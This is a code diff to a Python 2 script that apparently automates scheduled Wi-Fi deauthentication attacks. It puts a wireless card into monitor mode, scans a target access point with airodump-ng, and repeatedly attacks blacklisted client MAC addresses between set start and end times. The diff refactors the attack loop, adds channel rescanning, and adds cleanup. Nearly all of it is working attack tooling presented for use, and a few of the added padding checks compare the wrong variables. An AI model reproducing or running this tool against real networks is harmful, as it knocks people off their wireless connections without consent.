@@ -17,13 +17,19 @@ class Engine(object):
   self.bssid = mac     
   self.wlan  = wlan
   self.mode  = mode
-  self.s_hr  = s_hr
-  self.e_hr  = e_hr
-  self.s_min = s_min
-  self.e_min = e_min
+  self.s_hr  = int(s_hr)
+  self.e_hr  = int(e_hr)
+  self.s_min = int(s_min)
+  self.e_min = int(e_min)
   self.chan  = channel
   self.csv   = desti
-  self.delay = 60 if mode == 'S' else 30
+  self.alive = False
+  self.delay = False
+  self.dely  = 60 if mode == 'S' else 30
+  self.n_s_h = '0{}'.format(self.s_hr) if len(str(self.s_hr))<2 else self.s_hr
+  self.n_e_h = '0{}'.format(self.e_hr) if len(str(self.s_hr))<2 else self.e_hr
+  self.n_s_m = '0{}'.format(self.s_min) if len(str(self.s_min))<2 else self.s_min
+  self.n_e_m = '0{}'.format(self.e_min) if len(str(self.s_min))<2 else self.e_min
 
  def monitor(self):
   call(['ifconfig',self.wlan,'down'])
@@ -41,7 +47,14 @@ class Engine(object):
   exit()
 
  def scan(self):
+  Popen(['pkill','airodump-ng']).wait()
   cmd=['airodump-ng','--output-format','csv','--bssid',self.bssid,'-c',self.chan,'-w','list',self.wlan]
+  Popen(cmd,stderr=Devnull,stdout=Devnull)
+
+ def obtainInfo(self):
+  Popen(['pkill','airodump-ng']).wait()
+  self.clean()
+  cmd=['airodump-ng','--output-format','csv','-w','list',self.wlan]
   Popen(cmd,stderr=Devnull,stdout=Devnull)
   
  def attack(self,client):
@@ -54,18 +67,20 @@ class Engine(object):
 
  def status(self,current):
   hrs,mins=current[0],current[1]
-  if hrs==eval(self.s_hr) and mins==eval(self.s_min):return True
-  if hrs==eval(self.e_hr) and mins==eval(self.e_min):return False
+  if hrs==self.s_hr and mins==self.s_min:return True
+  if hrs==self.e_hr and mins==self.e_min:return False
 
  def channels(self):
-  with open(self.csv,'r') as AccessPoints:
-   Data = csv.reader(AccessPoints,delimiter=',')
-   for line in Data:
-    if len(line) >= 10:
-     chan  = str(line[3]).strip()
-     bssid = str(line[0]).strip()
-     if bssid==self.bssid:
-      return chan
+  try:
+   with open(self.csv,'r') as AccessPoints:
+    Data = csv.reader(AccessPoints,delimiter=',')
+    for line in Data:
+     if len(line) >= 10:
+      chan  = str(line[3]).strip()
+      bssid = str(line[0]).strip()
+      if bssid==self.bssid:
+       return chan
+  except:self.obtainInfo()
 
  def clean(self):
   list=(item for item in os.listdir('.') if item.endswith('.csv')) 
@@ -110,8 +125,6 @@ def main():
  chan  = Args.channel
  macs  = Args.mac
  mode  = mode[0]
- alive = False
- delay = False
  mem   = [[],[]]
  #
  blist=[mac for mac in blist]
@@ -124,70 +137,83 @@ def main():
  # Change Directory
  os.chdir('/tmp')
 
+ # Updates 
  def updates():
-  Popen(['pkill','airodump-ng']).wait()
-  engine.clean()
-  engine.scan()
-  time.sleep(5)
-  engine.chan=str(engine.channels())
+  if engine.alive:
+   engine.obtainInfo()
+   time.sleep(5)
+   Popen(['pkill','airodump-ng']).wait()
+   chan=str(engine.channels())
+   if chan: engine.chan=chan 
+   else:print '[!] Unable to locate: {}'.format(engine.bssid)
 
+ # Keeps An Eye On The Time While Main Process Is Busy
  def check():
-  while delay:
+  while engine.delay:
    n=engine.now()
    hrs,mins=n[0],n[1]
-   mem[0].append(int(hrs));mem[1].append(int(mins))  
-   time.sleep(.4)
+   if not int(hrs) in mem[0] and not int(mins) in mem[1]:
+    mem[0].append(int(hrs));mem[1].append(int(mins))  
+   for a,alpha in enumerate(mem[0]):
+    for b,beta in enumerate(mem[1]):
+     if a!=b:continue
+     if alpha == engine.e_hr and beta == engine.e_min:
+      engine.state=False
+      engine.alive=False
+      engine.delay=False
 
  # Start Proc
  while 1:
   try:
    engine.state=engine.status(engine.now())
-   if engine.state==None:msg=True if alive else False
-   if engine.state==True:
+   if engine.state==None:msg=True if engine.alive else False
+   if engine.state:
     call(['clear'])
-    print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,e_hr,e_min)
+    print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(engine.state,engine.n_e_h,engine.n_e_m)
+    
    elif engine.state==False:
     call(['clear'])
     engine.state=False
-    delay=False
-    alive=False
+    engine.delay=False
+    engine.alive=False
     Popen(['pkill','airodump-ng']).wait()
-    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,s_hr,s_min)
-    time.sleep(.4)
+    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(engine.state,engine.n_s_h,engine.n_s_m)
+    
    else:
-    call(['clear'])
-    print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,s_hr,s_min)
-    time.sleep(.4)
+    if engine.alive:
+     call(['clear'])
+     print 'Status\n[-] Attacking: {}\n[-] Attack Ends: {}:{}'.format(msg,engine.n_e_h,engine.n_e_m)
+     
+    else:
+     call(['clear'])
+     print 'Status\n[-] Attacking: {}\n[-] Attack Starts: {}:{}'.format(msg,engine.n_s_h,engine.n_s_m)
+     
    if engine.state:
-    if not alive:
-     alive=True 
+    if not engine.alive:
+     engine.alive=True 
      del mem[0][:];del mem[1][:] 
+
    if engine.state==False:
-    if alive:Popen(['pkill','airodump-ng']).wait();alive=False
-   if alive:
-    updates()
-    for i,client in enumerate(blist):
-     if i!=len(blist)-1:engine.attack(client);continue
-     bot=Thread(target=engine.attack,args=[client])
-     bot.start()
-     while bot.is_alive():pass
-    delay=True
+    if engine.alive:Popen(['pkill','airodump-ng']).wait();engine.alive=False
+
+   if engine.alive:
+    engine.delay=True
     Thread(target=check).start()
-    time.sleep(engine.delay) 
-    delay=False
-    for a,hrs in enumerate(mem[0]):
-     for b,mins in enumerate(mem[1]):
-      if a!=b:continue
-      if int(hrs)==engine.e_hr and int(mins)==engine.e_min:
-       engine.state=False
-    del mem[0][:];del mem[1][:] 
-                
+    updates()
+    engine.scan()
+    for i,client in enumerate(blist):
+     if i!=len(blist)-1:
+      for n in range(3):engine.attack(client);time.sleep(25)
+    time.sleep(engine.dely) 
+    engine.delay=False
+   time.sleep(.5)     
+   del mem[0][:];del mem[1][:]         
   except KeyboardInterrupt:
    call(['clear'])
-   delay=False
+   engine.delay=False
    Popen(['pkill','airodump-ng']).wait()
    Popen(['pkill','aireplay-ng']).wait()
-   for i in range(2):engine.managed()
+   for i in range(2):engine.managed();engine.clean()
 
 if __name__ == '__main__':
  # Filters
